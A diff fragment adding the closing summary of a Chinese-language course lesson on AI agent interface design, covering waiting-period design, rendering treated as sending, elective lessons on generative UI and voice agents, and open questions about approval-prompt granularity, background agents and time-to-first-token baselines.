+- **等待期的设计处在经典研究覆盖不到的区域**。能直接用的经典结论只有一条，内容是"你必须告知用户"。
+- **渲染即发送**。白名单，工具结果走同一条路径，而这个问题没有规范可引用。
+
+<Key>
+而 L00 那句欠条的答案是：你的优势不是"界面做得好看"。
+
+是这一节里**没有一个问题有现成的模式可抄**。它们全都是新的，所以它们归想清楚的人。
+</Key>
+
+这一节的流是文本，界面是你自己写的。两节选修各拿掉其中一个前提：
+
+- **L16x 生成式 UI 协议（深度选修）**——界面不再全是你写的。MCP Apps 把渲染权交给第三方代码，A2UI 把组件树交给 agent，问题变成它们能碰到你的哪些工具、消息、网络请求和状态
+- **L16y 语音 agent（选修）**——流变成了音频。「用户听到的才算说过」：按播放进度截断历史，就是这一节撤回的语音版
+
+### 给 L17 的欠条
+
+这一节留了三张：
+
+1. **审批 UI 的粒度问题。** 「每次都问」不是审批 UI 的核心——它是审批 UI 失效的方式（用户会开始无脑点允许）。这一节只给了「审批卡在 `canExecute` 上」这个技术边界，**什么该问、问几次、怎么记住答案**留给 L17，因为那是 agent 自己的策略问题。
+
+2. **后台 agent 的界面不是一个任务列表。** 多个 agent 并行、通知机制、从"看着它干"切到"让它自己干"——这些在 L17 到 L19 做 capstone 的时候会变成真实需求。这一节的演示台是单流的。
+
+3. **TTFT 的基线。** 这一节给了测量方法和标准指标名，但没有数字目标——因为厂商没公布。等你的 capstone 跑起来，那个数字就是你自己的基线，而且它会接回 L15 的账本。
